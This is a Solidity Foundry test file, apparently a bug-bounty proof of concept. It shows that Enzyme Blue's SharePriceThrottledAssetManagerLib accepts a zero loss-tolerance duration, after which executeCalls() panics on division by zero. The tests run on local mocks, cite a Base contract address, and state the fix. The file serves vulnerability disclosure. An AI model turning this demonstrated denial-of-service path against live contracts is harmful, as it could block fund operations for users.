// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.19;

import "forge-std/Test.sol";
import "../src/SharePriceThrottledAssetManagerLib.sol";
import "../src/Mocks.sol";

// ================================================================
//  PoC: Enzyme Blue - SharePriceThrottledAssetManagerLib
//  Bug: Missing validation for _lossTolerancePeriodDuration > 0
//       causes permanent DoS via division-by-zero panic (0x12)
//
//  Researcher : CONDEZ
//  Severity   : Medium
//  Contract   : 0x7A5125491025cF44380b6D95EC385ddd37455C22 (Base)
// ================================================================
contract EnzymeThrottleDoSPoC is Test {

    SharePriceThrottledAssetManagerLib public manager;
    MockFundValueCalculator            public calc;

    address public OWNER      = address(this);
    address public VAULT      = address(0xBEEF);
    address public SHUTDOWNER = address(0xDEAD);

    function setUp() public {
        calc    = new MockFundValueCalculator(1e18);
        manager = new SharePriceThrottledAssetManagerLib(calc);
    }

    // ============================================================
    // TEST 1: init() acepta duration=0 sin revertir
    // Demuestra la falta de validacion en init()
    // ============================================================
    function test_1_Init_AcceptsDurationZero_NoValidation() public {
        // El contrato acepta duration=0 sin revertir
        // Deberia revertir con InvalidDuration pero no lo hace
        manager.init(OWNER, VAULT, uint64(2e17), 0, SHUTDOWNER);

        assertEq(manager.getLossTolerancePeriodDuration(), 0);
        assertEq(manager.getOwner(), OWNER);
    }

    // ============================================================
    // TEST 2: DoS permanente - call path completo sin vm.prank
    //
    // Flujo:
    //   1. init() con duration=0                -> OK (bug: deberia revertir)
    //   2. executeCalls() con perdida           -> OK (cumulativeLoss era 0)
    //   3. executeCalls() con perdida de nuevo  -> PANIC 0x12 (division por 0)
    // ============================================================
    function test_2_FullCallPath_PermanentDoS() public {
        // Paso 1: inicializar con duration=0
        manager.init(OWNER, VAULT, uint64(2e17), 0, SHUTDOWNER);

        // Paso 2: primera executeCalls con perdida del 10%
        // cumulativeLoss era 0 -> no hay division -> pasa OK
        calc.setPrice(1e18);
        PriceManipulator m1 = new PriceManipulator(calc, 9e17);
        SharePriceThrottledAssetManagerLib.Call[] memory calls =
            new SharePriceThrottledAssetManagerLib.Call[](1);
        calls[0] = SharePriceThrottledAssetManagerLib.Call({
            target: address(m1),
            data:   abi.encodeWithSignature("execute()")
        });
        manager.executeCalls(calls);

        // Verificar que cumulativeLoss quedo registrado
        assertGt(manager.getThrottle().cumulativeLoss, 0);

        // Paso 3: segunda executeCalls con perdida
        // cumulativeLoss > 0 -> intenta calcular replenishment
        // -> division por lossTolerancePeriodDuration=0
        // -> PANIC: division or modulo by zero (0x12)
        calc.setPrice(9e17);
        PriceManipulator m2 = new PriceManipulator(calc, 8e17);
        calls[0] = SharePriceThrottledAssetManagerLib.Call({
            target: address(m2),
            data:   abi.encodeWithSignature("execute()")
        });

        vm.expectRevert();
        manager.executeCalls(calls);
        // executeCalls() queda PERMANENTEMENTE bloqueado
    }

    // ============================================================
    // TEST 3: Contraste — con duration valido no hay DoS
    // Mismo escenario, dos perdidas consecutivas, ambas pasan
    // ============================================================
    function test_3_ValidDuration_NoDoS_Contrast() public {
        // Mismo setup pero duration=86400 (1 dia), tolerancia=50%
        manager.init(OWNER, VAULT, uint64(5e17), 86400, SHUTDOWNER);

        // Primera perdida: 1%
        calc.setPrice(1e18);
        PriceManipulator m1 = new PriceManipulator(calc, 99e16);
        SharePriceThrottledAssetManagerLib.Call[] memory calls =
            new SharePriceThrottledAssetManagerLib.Call[](1);
        calls[0] = SharePriceThrottledAssetManagerLib.Call({
            target: address(m1),
            data:   abi.encodeWithSignature("execute()")
        });
        manager.executeCalls(calls);

        // Avanzar 12 horas para replenishment parcial
        vm.warp(block.timestamp + 43200);

        // Segunda perdida: 1%
        calc.setPrice(99e16);
        PriceManipulator m2 = new PriceManipulator(calc, 9801e14);
        calls[0] = SharePriceThrottledAssetManagerLib.Call({
            target: address(m2),
            data:   abi.encodeWithSignature("execute()")
        });
        manager.executeCalls(calls);

        // Con duration valido no hay DoS
        // El fix es: require(_lossTolerancePeriodDuration > 0) en init()
    }
}
